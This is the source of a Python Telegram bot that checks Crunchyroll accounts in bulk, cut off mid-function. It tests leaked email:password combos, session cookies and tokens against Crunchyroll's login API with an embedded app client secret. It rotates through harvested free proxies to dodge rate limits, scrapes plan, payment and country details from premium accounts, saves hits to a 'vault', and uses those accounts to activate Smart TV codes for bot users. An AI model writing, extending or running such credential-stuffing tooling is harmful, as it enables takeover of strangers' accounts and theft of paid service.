#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CrunchyrollChecker + Vault + Smart TV Login Bot
"""

import os
import re
import io
import sys
import csv
import json
import time
import base64
import random
import asyncio
import logging
import zipfile
import tempfile
import threading
import requests
import uuid
from pathlib import Path
from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta, timezone

try:
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)

try:
    from telegram import (
        Update,
        InputFile,
        InlineKeyboardButton,
        InlineKeyboardMarkup,
        ReplyKeyboardRemove,
        BotCommand,
    )
    from telegram.constants import ParseMode
    from telegram.error import BadRequest, RetryAfter
    from telegram.ext import (
        Application,
        CommandHandler,
        MessageHandler,
        CallbackQueryHandler,
        ContextTypes,
        filters,
    )
except ImportError:
    print("[!] pip install python-telegram-bot==22.8")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

try:
    import socks  # noqa: F401
    SOCKS5_OK = True
except ImportError:
    SOCKS5_OK = False


# ===================== CONFIG (env-driven) =====================
def _load_dotenv() -> None:
    env_path = Path(__file__).resolve().parent / ".env"
    if not env_path.exists():
        return
    try:
        for line in env_path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, _, val = line.partition("=")
            key = key.strip()
            val = val.strip().strip("'\"")
            if key and key not in os.environ:
                os.environ[key] = val
    except OSError:
        pass


def _env(name: str, default: str = "") -> str:
    v = os.getenv(name)
    if v is None or str(v).strip() == "":
        return default
    return str(v).strip()


_load_dotenv()

BOT_TOKEN = _env("BOT_TOKEN")
try:
    OWNER_ID = int(_env("OWNER_ID", "0") or 0)
except ValueError:
    OWNER_ID = 0
OWNER_USERNAME = _env("OWNER_USERNAME", "@unknown")

_raw_ids = _env("OWNER_IDS", "") or _env("ADMIN_IDS", "")
ADMIN_IDS = set()
if _raw_ids:
    for _x in re.split(r"[,\s]+", _raw_ids):
        _x = _x.strip()
        if _x.isdigit():
            ADMIN_IDS.add(int(_x))
if OWNER_ID:
    ADMIN_IDS.add(OWNER_ID)

_raw_un = _env("ADMIN_USERNAMES", "") or _env("ADMIN_USERNAME", "")
ADMIN_USERNAMES = set()
if _raw_un:
    for _u in re.split(r"[,\s]+", _raw_un):
        _u = _u.strip().lstrip("@").lower()
        if _u:
            ADMIN_USERNAMES.add(_u)
if OWNER_USERNAME and OWNER_USERNAME.lstrip("@"):
    ADMIN_USERNAMES.add(OWNER_USERNAME.lstrip("@").lower())

DATA_DIR = Path(_env("DATA_DIR", "data"))
DATA_DIR.mkdir(parents=True, exist_ok=True)
VAULT_PATH = DATA_DIR / "cr_vault.json"

PORT = int(_env("PORT", "8000") or 8000)
THREADS = int(_env("THREADS", "150") or 150)
PROXY_REFRESH_MINUTES = 5
MAX_PROXIES_TO_KEEP = 500
PROXY_TEST_TIMEOUT = 2
PROXY_TEST_SAMPLE = 1000
CHECK_TIMEOUT = 10

DAILY_TV_LIMIT = int(_env("DAILY_TV_LIMIT", "10") or 10)
IST = timezone(timedelta(hours=5, minutes=30))

USER_LAST_CHECK: dict = {}
USER_LOCK = threading.Lock()
MAX_FILE_MB = 20
PREMIUM_ONLY_DEFAULT = True
MAX_PASTED_CREDS = 2000
MAX_PASTED_PROXIES = 5000
MAX_HIT_CARDS = 150

START_TIME = time.time()
CHECKS_DONE = 0
CHECKS_LOCK = threading.Lock()


def is_admin(uid: int, username: str = None) -> bool:
    if uid in ADMIN_IDS:
        return True
    if username:
        un = str(username).lstrip("@").lower()
        if un in ADMIN_USERNAMES:
            return True
    try:
        if STORE and hasattr(STORE, "get_setting"):
            dyn_ids = STORE.get_setting("admin_ids", []) or []
            if uid in dyn_ids:
                return True
            dyn_uns = STORE.get_setting("admin_usernames", []) or []
            if username and str(username).lstrip("@").lower() in [x.lower() for x in dyn_uns]:
                return True
    except Exception:
        pass
    return False


def bump_checks(n: int) -> None:
    global CHECKS_DONE
    with CHECKS_LOCK:
        CHECKS_DONE += n


def uptime() -> str:
    s = int(time.time() - START_TIME)
    d, r = divmod(s, 86400)
    h, r = divmod(r, 3600)
    m, sec = divmod(r, 60)
    parts = []
    if d:
        parts.append(f"{d}d")
    if h:
        parts.append(f"{h}h")
    parts.append(f"{m}m {sec}s")
    return " ".join(parts)


def _fmt_duration(sec: float) -> str:
    sec = max(0, int(sec))
    m, s = divmod(sec, 60)
    h, m = divmod(m, 60)
    return f"{h}h {m}m {s}s" if h else f"{m}m {s}s"


def _fmt_cpm(processed: int, elapsed: float) -> int:
    if elapsed <= 0 or processed <= 0:
        return 0
    return int(processed / elapsed * 60)


def _fmt_eta(total: int, processed: int, cpm: int) -> str:
    if cpm <= 0 or total <= processed:
        return "—"
    return _fmt_duration(int((total - processed) * 60 / cpm))


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger("CrunchyBot")


# ===================== SMALL HELPERS =====================
def esc(v) -> str:
    if v is None or v == "":
        return "N/A"
    return str(v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def now_utc() -> datetime:
    return datetime.now(timezone.utc)


def parse_iso(s) -> Optional[datetime]:
    if not s:
        return None
    try:
        dt = datetime.fromisoformat(str(s).replace("Z", "+00:00"))
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt
    except (ValueError, TypeError):
        return None


def days_left_until(iso_date: str) -> str:
    if not iso_date:
        return "N/A"
    dt = parse_iso(iso_date)
    if not dt:
        return "N/A"
    return str(max(0, (dt - now_utc()).days))


def _clean_err(e) -> str:
    return " ".join(str(e).split())[:60]


def flag_emoji(cc) -> str:
    cc = (cc or "").upper().strip()
    if len(cc) != 2 or not cc.isalpha():
        return ""
    return "".join(chr(0x1F1E6 + ord(c) - 65) for c in cc)


# ===================== VAULT STORAGE =====================
_VAULT_LOCK = threading.Lock()


def load_vault() -> List[dict]:
    with _VAULT_LOCK:
        if VAULT_PATH.exists():
            try:
                return json.loads(VAULT_PATH.read_text(encoding="utf-8"))
            except Exception:
                return []
        return []


def save_vault(items: List[dict]) -> None:
    with _VAULT_LOCK:
        try:
            tmp = VAULT_PATH.with_suffix(".tmp")
            tmp.write_text(json.dumps(items, indent=2, ensure_ascii=False), encoding="utf-8")
            os.replace(tmp, VAULT_PATH)
        except Exception as e:
            logger.warning("Vault save failed: %s", e)


def _cred_key(cred: dict) -> str:
    t = cred.get("type", "")
    v = cred.get("value", "")
    return f"{t}:{v.lower() if t == 'email' else v[:64]}"


def add_to_vault(entries: List[dict]) -> int:
    if not entries:
        return 0
    with _VAULT_LOCK:
        current = []
        if VAULT_PATH.exists():
            try:
                current = json.loads(VAULT_PATH.read_text(encoding="utf-8"))
            except Exception:
                current = []
        have = {_cred_key(x.get("cred", {})) for x in current}
        added = 0
        for e in entries:
            cred = e.get("cred") or {}
            k = _cred_key(cred)
            if not k or k in have:
                continue
            current.append({
                "cred": cred,
                "data": e.get("data") or {},
                "added_at": int(time.time()),
            })
            have.add(k)
            added += 1
        if added:
            try:
                tmp = VAULT_PATH.with_suffix(".tmp")
                tmp.write_text(json.dumps(current, indent=2, ensure_ascii=False), encoding="utf-8")
                os.replace(tmp, VAULT_PATH)
            except Exception as exc:
                logger.warning("Vault write failed: %s", exc)
        return added


def remove_from_vault(cred: dict) -> None:
    target = _cred_key(cred)
    with _VAULT_LOCK:
        if not VAULT_PATH.exists():
            return
        try:
            current = json.loads(VAULT_PATH.read_text(encoding="utf-8"))
        except Exception:
            return
        filtered = [x for x in current if _cred_key(x.get("cred", {})) != target]
        if len(filtered) != len(current):
            try:
                tmp = VAULT_PATH.with_suffix(".tmp")
                tmp.write_text(json.dumps(filtered, indent=2, ensure_ascii=False), encoding="utf-8")
                os.replace(tmp, VAULT_PATH)
            except Exception:
                pass


def vault_count() -> int:
    return len(load_vault())


# ===================== TV QUOTA =====================
_tv_quota: Dict[int, dict] = {}
_TV_QUOTA_LOCK = threading.Lock()


def tv_quota_check(uid: int, username: str = None):
    if is_admin(uid, username):
        return True, 9999
    today = datetime.now(IST).strftime("%Y-%m-%d")
    with _TV_QUOTA_LOCK:
        rec = _tv_quota.setdefault(uid, {"date": today, "count": 0})
        if rec["date"] != today:
            rec["date"] = today
            rec["count"] = 0
        rem = DAILY_TV_LIMIT - rec["count"]
        return rem > 0, max(0, rem)


def tv_quota_inc(uid: int, username: str = None) -> None:
    if is_admin(uid, username):
        return
    today = datetime.now(IST).strftime("%Y-%m-%d")
    with _TV_QUOTA_LOCK:
        rec = _tv_quota.setdefault(uid, {"date": today, "count": 0})
        if rec["date"] != today:
            rec["date"] = today
            rec["count"] = 0
        rec["count"] += 1


# ===================== CRUNCHYROLL API =====================
API_HOST = "https://beta-api.crunchyroll.com"
CLIENT_ID = "rjs0ltx0dbwkliwxdzdf"
CLIENT_SECRET = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"

APP_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
APP_DEVICE_TYPE = "Google SDK built for x86"
APP_DEVICE_NAME = "sdk_google_atv_x86"
BARO_WUA = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36"
)
PLAN_BY_STREAMS = {"1": "Fan", "4": "Mega Fan", "6": "Ultimate Fan"}
BILLING_MAP = {"P1D": "Daily", "P1W": "Weekly", "P1M": "Monthly", "P3M": "3 Months", "P1Y": "Annual"}

COUNTRY_MAP = {
    "IN": "India", "US": "United States", "GB": "United Kingdom", "CA": "Canada",
    "AU": "Australia", "DE": "Germany", "FR": "France", "IT": "Italy", "ES": "Spain",
    "BR": "Brazil", "MX": "Mexico", "AR": "Argentina", "CL": "Chile", "CO": "Colombia",
    "PE": "Peru", "JP": "Japan", "KR": "South Korea", "SG": "Singapore", "MY": "Malaysia",
    "TH": "Thailand", "PH": "Philippines", "ID": "Indonesia", "VN": "Vietnam",
    "PK": "Pakistan", "BD": "Bangladesh", "AE": "UAE", "SA": "Saudi Arabia",
    "TR": "Turkey", "NL": "Netherlands", "SE": "Sweden", "NO": "Norway", "PL": "Poland",
}

_tls = threading.local()


def get_session() -> requests.Session:
    s = getattr(_tls, "s", None)
    if s is None:
        s = requests.Session()
        s.headers.update({"Accept-Encoding": "gzip", "Connection": "keep-alive"})
        try:
            retry = Retry(total=1, backoff_factor=0.1, status_forcelist=[429, 500, 502, 503, 504])
            adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=retry, pool_block=False)
            s.mount("https://", adapter)
            s.mount("http://", adapter)
        except Exception:
            s.mount("https://", HTTPAdapter(pool_connections=100, pool_maxsize=100))
            s.mount("http://", HTTPAdapter(pool_connections=100, pool_maxsize=100))
        _tls.s = s
    return s


def _req(session, method, url, proxy, **kw):
    try:
        return session.request(method, url, proxies=proxy, timeout=CHECK_TIMEOUT, **kw)
    except requests.RequestException:
        if proxy:
            return session.request(method, url, timeout=CHECK_TIMEOUT, **kw)
        raise


def _blank_data(user: str) -> dict:
    return {
        "user": user.split("@")[0] if user else "",
        "verified": False,
        "plan": "",
        "sku": "",
        "streams": "",
        "expiry": "",
        "days_left": "N/A",
        "renew": False,
        "trial": False,
        "duration": "",
        "price": "",
        "currency": "",
        "plan_type": "",
        "created": "",
        "payment": "",
        "cc": "",
        "country_name": "",
        "info": "",
        "account_id": "",
        "external_id": "",
        "sub_id": "",
        "sub_status": "",
        "next_renewal": "",
        "start_date": "",
        "billing_cycle": "",
        "payment_method": "",
        "benefits": "",
    }


def app_login(user: str, pw: str, proxy: Optional[dict] = None):
    s = get_session()
    try:
        r = _req(
            s,
            "POST",
            f"{API_HOST}/auth/v1/token",
            proxy,
            data={
                "grant_type": "password",
                "username": user,
                "password": pw,
                "scope": "offline_access",
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "device_type": APP_DEVICE_TYPE,
                "device_id": str(uuid.uuid4()),
                "device_name": APP_DEVICE_NAME,
            },
            headers={
                "User-Agent": APP_UA,
                "Accept": "application/json",
                "Accept-Charset": "UTF-8",
                "Accept-Encoding": "gzip",
                "Connection": "Keep-Alive",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "ETP-Anonymous-ID": str(uuid.uuid4()),
                "Request-Type": "SignIn",
            },
        )
    except requests.RequestException as e:
        return None, f"network: {_clean_err(e)}"
    src = r.text or ""
    low = src.lower()
    if r.status_code == 429 or "too_many_requests" in src or "rate limited" in low:
        return None, "rate"
    if any(x in low for x in ("two_factor", "2fa", "mfa_required", "otp_required", "otp_code", "verification_required")):
        return None, "2fa"
    if "invalid_grant" in src or "invalid_credentials" in src or r.status_code in (400, 401):
        return None, "bad"
    try:
        j = r.json()
    except ValueError:
        return None, f"json fail ({r.status_code})"
    if r.status_code != 200 or not isinstance(j, dict) or not j.get("access_token"):
        return None, "no token"
    return j, "ok"


def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
    d = _blank_data(user)
    j, st = app_login(user, pw, proxy)
    if j is None:
        if st in ("bad", "rate", "2fa"):
            return st, d
        return "err", d
    tk = j["access_token"]
    hdr = {
        "Authorization": f"Bearer {tk}",
        "User-Agent": BARO_WUA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    }
    s = get_session()

    try:
        r = _req(s, "GET", f"{API_HOST}/accounts/v1/me/multiprofile", proxy, headers=hdr)
        mp = r.json()
        if isinstance(mp, dict):
            profiles = mp.get("profiles") or []
            primary = next((p for p in profiles if p.get("is_primary")), None) or (profiles[0] if profiles else None)
            if primary and primary.get("profile_name"):
                d["user"] = primary["profile_name"]
    except (requests.RequestException, ValueError):
        pass

    me = {}
    try:
        r = _req(s, "GET", f"{API_HOST}/accounts/v1/me", proxy, headers=hdr)
        me = r.json()
    except (requests.RequestException, ValueError):
        pass
    if isinstance(me, dict):
        d["verified"] = bool(me.get("email_verified"))
        if me.get("username") and d["user"] == (user.split("@")[0] if user else ""):
            d["user"] = me["username"]
    ext = me.get("external_id", "") if isinstance(me, dict) else ""
    acc = me.get("account_id", "") if isinstance(me, dict) else ""
    if not ext:
        return "free", d

    try:
        r = _req(s, "GET", f"{API_HOST}/subs/v1/subscriptions/{ext}/benefits", proxy, headers=hdr)
        bsrc = r.text if r.status_code == 200 else ""
    except requests.RequestException:
        bsrc = ""
    if (
        not bsrc
        or any(x in bsrc for x in ("subscription.not_found", "Subscription Not Found", '"total":0', '"subscription_country":""'))
        or "concurrent_streams" not in bsrc
    ):
        return "free", d

    d["account_id"] = acc or ""
    d["external_id"] = ext or ""
    d["benefits"] = bsrc[:500]
    m = re.search(r'"concurrent_streams\.(\d+)"', bsrc)
    if m:
        d["streams"] = m.group(1)
        d["plan"] = PLAN_BY_STREAMS.get(m.group(1), f"Plan {m.group(1)}")
    m = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', bsrc)
    if m:
        d["cc"] = m.group(1)
        d["country_name"] = COUNTRY_MAP.get(d["cc"], d["cc"])
    m = re.search(r'"source"\s*:\s*"([^"]+)"', bsrc)
    if m:
        d["payment"] = m.group(1)
        d["payment_method"] = m.group(1)

    if acc:
        try:
            r = _req(s, "GET", f"{API_HOST}/subs/v3/subscriptions/{acc}", proxy, headers=hdr)
            s3 = r.text or ""
            m = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', s3)
            if m:
                d["expiry"] = m.group(1)
                d["days_left"] = days_left_until(m.group(1))
            m = re.search(r'"auto_renew"\s*:\s*(true|false)', s3)
            if m:
                d["renew"] = m.group(1) == "true"
            m = re.search(r'"sku"\s*:\s*"([^"]+)"', s3)
            if m:
                d["sku"] = m.group(1)
        except requests.RequestException:
            pass

    if acc:
        try:
            r = _req(s, "GET", f"{API_HOST}/subs/v4/accounts/{acc}/subscriptions", proxy, headers=hdr)
            v4 = r.json()
            if isinstance(v4, dict):
                subs4 = v4.get("subscriptions") or []
                sub4 = subs4[0] if subs4 else {}
                plan4 = sub4.get("plan") or {}
                price4 = plan4.get("price") or {}
                if sub4.get("nextRenewalDate") and not d["expiry"]:
                    d["expiry"] = sub4["nextRenewalDate"][:10]
                    d["days_left"] = days_left_until(sub4["nextRenewalDate"])
                if sub4.get("startDate"):
                    d["created"] = sub4["startDate"][:10]
                d["trial"] = bool(plan4.get("activeFreeTrial"))
                if plan4.get("planType"):
                    d["plan_type"] = plan4["planType"]
                cyc = price4.get("cycleDuration") or ""
                if cyc:
                    d["duration"] = BILLING_MAP.get(cyc, cyc)
                if price4.get("amount") is not None:
                    d["price"] = str(price4["amount"])
                    d["currency"] = price4.get("currencyCode", "")
                pay = v4.get("currentPaymentMethod") or {}
                if pay.get("name") and not d["payment"]:
                    d["payment"] = pay["name"]
        except (requests.RequestException, ValueError):
            pass
    return "hit", d


def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None):
    st, d = check_account_app(user, pw, proxy)
    if st == "rate":
        try:
            new_proxy = get_random_proxy()
            if new_proxy and new_proxy != proxy:
                time.sleep(0.5)
                st2, d2 = check_account_app(user, pw, new_proxy)
                if st2 != "rate":
                    return st2, d2
        except Exception:
            pass
    return st, d


def etp_rt_to_token(etp_rt: str, proxy: Optional[dict] = None):
    s = get_session()
    data = {
        "grant_type": "etp_rt_cookie",
        "device_id": str(uuid.uuid4()),
        "device_type": "Firefox on Windows",
    }
    headers = {
        "User-Agent": BARO_WUA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Origin": "https://www.crunchyroll.com",
        "Referer": "https://www.crunchyroll.com/",
    }
    try:
        r = _req(
            s,
            "POST",
            f"{API_HOST}/auth/v1/token",
            proxy,
            data=data,
            headers=headers,
            cookies={"etp_rt": etp_rt},
        )
    except requests.RequestException as e:
        return None, f"network: {_clean_err(e)}"
    try:
        j = r.json()
    except ValueError:
        return None, f"http_{r.status_code}"
    if r.status_code != 200 or not isinstance(j, dict) or "access_token" not in j:
        return None, (j or {}).get("error") or (j or {}).get("code") or f"http_{r.status_code}"
    return j, ""


def cr_me(bearer: str, proxy: Optional[dict] = None):
    s = get_session()
    try:
        r = _req(
            s,
            "GET",
            f"{API_HOST}/accounts/v1/me",
            proxy,
            headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
        )
    except requests.RequestException as e:
        return None, f"network: {_clean_err(e)}"
    if r.status_code != 200:
        return None, f"http_{r.status_code}"
    try:
        return r.json(), ""
    except ValueError:
        return None, "bad_json"


def cr_subscriptions(account_id, bearer: str, proxy: Optional[dict] = None):
    if not account_id:
        return None
    s = get_session()
    try:
        r = _req(
            s,
            "GET",
            f"{API_HOST}/subs/v4/accounts/{account_id}/subscriptions",
            proxy,
            headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
        )
        return r.json() if r.status_code == 200 else None
    except (requests.RequestException, ValueError):
        return None


def cr_profiles(bearer: str, proxy: Optional[dict] = None):
    s = get_session()
    try:
        r = _req(
            s,
            "GET",
            f"{API_HOST}/accounts/v1/me/multiprofile",
            proxy,
            headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
        )
        return r.json() if r.status_code == 200 else None
    except (requests.RequestException, ValueError):
        return None


def is_token_expired(token: str) -> bool:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return False
        payload = parts[1] + "=" * (-len(parts[1]) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        exp = data.get("exp")
        return bool(exp and int(exp) < time.time())
    except Exception:
        return False


def check_token_or_cookie(bearer: str, proxy: Optional[dict] = None):
    me_data, merr = cr_me(bearer, proxy)
    if not me_data:
        return "err", dict(_blank_data(""), info=merr or "me_failed")
    acc = me_data.get("account_id")
    sub_data = cr_subscriptions(acc, bearer, proxy)
    prof_data = cr_profiles(bearer, proxy)

    subs = (sub_data or {}).get("subscriptions") or []
    active = next((x for x in subs if str(x.get("status", "")).lower() == "active"), None)
    premium = active is not None
    if not premium and me_data.get("external_id"):
        try:
            s = get_session()
            r = _req(
                s,
                "GET",
                f"{API_HOST}/subs/v1/subscriptions/{me_data['external_id']}/benefits",
                proxy,
                headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
            )
            if r.status_code == 200 and "concurrent_streams" in (r.text or ""):
                premium = True
        except requests.RequestException:
            pass

    d = _blank_data(me_data.get("email") or "")
    d["user"] = me_data.get("email") or me_data.get("username") or d["user"]
    d["verified"] = bool(me_data.get("email_verified"))
    profiles = (prof_data or {}).get("profiles") or []
    primary = next((p for p in profiles if p.get("is_primary")), None)
    if primary and primary.get("profile_name"):
        d["user"] = primary["profile_name"]
    if active:
        plan = active.get("plan") or {}
        price = plan.get("price") or {}
        d["plan"] = (plan.get("tier") or {}).get("text") or active.get("sku") or "Premium"
        for b in plan.get("benefits") or []:
            nm = str(b.get("name", "")) if isinstance(b, dict) else ""
            if nm.startswith("concurrent_streams"):
                m = re.search(r"(\d+)$", nm)
                if m:
                    d["streams"] = m.group(1)
                break
        d["cc"] = plan.get("countryCode") or ""
        d["country_name"] = COUNTRY_MAP.get(d["cc"], d["cc"])
        cyc = price.get("cycleDuration") or ""
        d["duration"] = BILLING_MAP.get(cyc, cyc)
        d["currency"] = price.get("currencyCode") or ""
        d["price"] = str(price.get("amount", ""))
        d["trial"] = bool(plan.get("activeFreeTrial"))
        d["plan_type"] = plan.get("planType") or ""
        d["expiry"] = (active.get("nextRenewalDate") or "")[:10]
        d["days_left"] = days_left_until(active.get("nextRenewalDate") or "")
        d["created"] = (active.get("startDate") or "")[:10]
        d["renew"] = active.get("subscriptionQualifier") == "RECURRING"
        pay = (sub_data or {}).get("currentPaymentMethod") or {}
        d["payment"] = pay.get("name") or ""
    return ("hit" if premium else "free"), d


def check_credential(cred: dict, proxy: Optional[dict] = None) -> dict:
    t = cred.get("type")
    try:
        if t == "email":
            st, d = check_account_app_retry(cred["value"], cred.get("password", ""), proxy)
            return {"st": st, "data": d}
        if t == "cookie":
            j, err = etp_rt_to_token(cred["value"], proxy)
            if not j:
                return {"st": "err", "data": dict(_blank_data(""), info=err)}
            st, d = check_token_or_cookie(j["access_token"], proxy)
            return {"st": st, "data": d}
        if t == "token":
            if is_token_expired(cred["value"]):
                return {"st": "err", "data": dict(_blank_data(""), info="expired token")}
            st, d = check_token_or_cookie(cred["value"], proxy)
            return {"st": st, "data": d}
    except Exception as e:
        return {"st": "err", "data": dict(_blank_data(""), info=_clean_err(e))}
    return {"st": "err", "data": dict(_blank_data(""), info="unknown_type")}


def activate_tv(bearer: str, code: str, proxy: Optional[dict] = None):
    """Activate Crunchyroll Smart TV device code via bearer token."""
    s = get_session()
    clean_code = re.sub(r"[^A-Za-z0-9]", "", str(code or "")).upper().strip()
    if len(clean_code) != 6:
        return False, "invalid_code_format"

    last_err = "activation_failed"
    headers = {
        "Authorization": f"Bearer {bearer}",
        "User-Agent": BARO_WUA,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.crunchyroll.com",
        "Referer": "https://www.crunchyroll.com/activate",
    }
    for base in ("https://www.crunchyroll.com", API_HOST):
        try:
            r = _req(
                s,
                "POST",
                f"{base}/auth/v1/device",
                proxy,
                json={"user_code": clean_code},
                headers=headers,
            )
            if r.status_code in (200, 201, 204):
                return True, ""
            last_err = f"http_{r.status_code}"
            try:
                j = r.json()
                if isinstance(j, dict):
                    err_code = j.get("code") or j.get("error") or j.get("message")
                    if err_code:
                        last_err = str(err_code)
            except ValueError:
                pass
            if any(k in last_err.lower() for k in ("invalid", "expired", "not_found", "code")):
                return False, last_err
        except requests.RequestException as e:
            last_err = f"network: {_clean_err(e)}"
    return False, last_err


# ===================== PROXY POOL =====================
PROXY_SOURCES = [
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
]
PROXY_TEST_URLS = [
    "https://httpbin.org/ip",
    "https://api.ipify.org?format=json",
    "https://www.google.com/generate_204",
]

LIVE_PROXIES: List[dict] = []
PROXY_SCORES: dict = {}
REFRESH_STATE: dict = {"tested": 0, "live": 0, "total": 0, "start": 0}
PROXY_LOCK = threading.Lock()
_refresh_busy = threading.Lock()
LAST_PROXY_HARVEST = 0.0
POOL_FILE = DATA_DIR / "proxies_pool.txt"


def proxy_count() -> int:
    with PROXY_LOCK:
        return len(LIVE_PROXIES)


def get_random_proxy() -> Optional[dict]:
    with PROXY_LOCK:
        if not LIVE_PROXIES:
            return None
        if len(LIVE_PROXIES) > 5 and PROXY_SCORES:
            try:
                scored = sorted(LIVE_PROXIES, key=lambda x: PROXY_SCORES.get(x.get("https", ""), 0), reverse=True)
                top = scored[: len(scored) // 2]
                if random.random() < 0.7:
                    return random.choice(top)
            except Exception:
                pass
        return random.choice(LIVE_PROXIES)


def harvest_proxies() -> List[str]:
    raw = set()
    s = requests.Session()
    for url in PROXY_SOURCES:
        for verify in (True, False):
            try:
                r = s.get(url, timeout=12, headers={"User-Agent": BARO_WUA}, verify=verify)
                if r.status_code == 200 and r.text:
                    for line in r.text.splitlines():
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        if "://" in line:
                            line = line.split("://", 1)[-1]
                        line = line.split("/")[0].split()[0]
                        if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", line):
                            raw.add(line)
                    break
            except requests.RequestException:
                if verify:
                    continue
                break
            except Exception:
                break
    return list(raw)


def test_one_proxy(proxy_str: str) -> Optional[dict]:
    schemes = ["http"]
    if SOCKS5_OK:
        schemes.append("socks5")
    for scheme in schemes:
        proxies = {"http": f"{scheme}://{proxy_str}", "https": f"{scheme}://{proxy_str}"}
        for url in PROXY_TEST_URLS:
            try:
                r = requests.get(url, proxies=proxies, timeout=PROXY_TEST_TIMEOUT, headers={"User-Agent": BARO_WUA})
                if r.status_code in (200, 204):
                    return proxies
            except requests.RequestException:
                continue
    return None


def test_proxy_url(proxy_url: str) -> Optional[dict]:
    for url in PROXY_TEST_URLS:
        try:
            r = requests.get(
                url,
                proxies={"http": proxy_url, "https": proxy_url},
                timeout=PROXY_TEST_TIMEOUT,
                headers={"User-Agent": BARO_WUA},
            )
            if r.status_code in (200, 204):
                return {"http": proxy_url, "https": proxy_url}
        except requests.RequestException:
            continue
    return None


def refresh_live_proxies(force: bool = False) -> None:
    global LIVE_PROXIES, LAST_PROXY_HARVEST
    now = time.time()
    with PROXY_LOCK:
        fresh = LIVE_PROXIES and (now - LAST_PROXY_HARVEST) < PROXY_REFRESH_MINUTES * 60
    if not force and fresh:
        return
    if not _refresh_busy.acquire(blocking=False):
        return
    try:
        candidates = harvest_proxies()
        if not candidates:
            return
        random.shuffle(candidates)
        to_test = candidates[:PROXY_TEST_SAMPLE]
        live = []
        REFRESH_STATE["total"] = len(to_test)
        REFRESH_STATE["tested"] = 0
        REFRESH_STATE["live"] = 0
        REFRESH_STATE["start"] = time.time()
        with ThreadPoolExecutor(max_workers=150) as ex:
            futures = {ex.submit(test_one_proxy, p): p for p in to_test}
            for fut in as_completed(futures):
                REFRESH_STATE["tested"] += 1
                try:
                    res = fut.result()
                except Exception:
                    continue
                if res:
                    live.append(res)
                    REFRESH_STATE["live"] = len(live)
                    if len(live) >= MAX_PROXIES_TO_KEEP:
                        for f in futures:
                            f.cancel()
                        break
        if not live and candidates:
            live = [{"http": f"http://{c}", "https": f"http://{c}"} for c in candidates[:20]]
        with PROXY_LOCK:
            LIVE_PROXIES = live
            LAST_PROXY_HARVEST = now
    finally:
        _refresh_busy.release()


def ensure_proxies() -> None:
    if proxy_count() == 0:
        _load_pool_into_live()
        if proxy_count() == 0:
            refresh_live_proxies(force=True)


def _proxy_loop() -> None:
    while True:
        try:
            auto_on = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
            if auto_on:
                if proxy_count() < 20:
                    refresh_live_proxies(force=True)
                else:
                    refresh_live_proxies(force=False)
        except Exception as e:
            logger.warning("Proxy loop error: %s", e)
        for _ in range(PROXY_REFRESH_MINUTES):
            time.sleep(60)
            if proxy_count() < 15:
                break


def pool_load() -> List[str]:
    try:
        if POOL_FILE.exists():
            return [l.strip() for l in POOL_FILE.read_text(encoding="utf-8").splitlines() if l.strip()]
    except OSError:
        pass
    return []


def pool_save(items: List[str]):
    try:
        POOL_FILE.write_text("\n".join(items) + ("\n" if items else ""), encoding="utf-8")
    except OSError as e:
        logger.warning("Pool save failed: %s", e)


def pool_size() -> int:
    return len(pool_load())


def normalize_proxy(line: str) -> Optional[str]:
    line = (line or "").strip()
    if not line:
        return None
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    parts = line.split(":")
    if len(parts) == 4 and parts[0] and parts[2] and parts[3].isdigit():
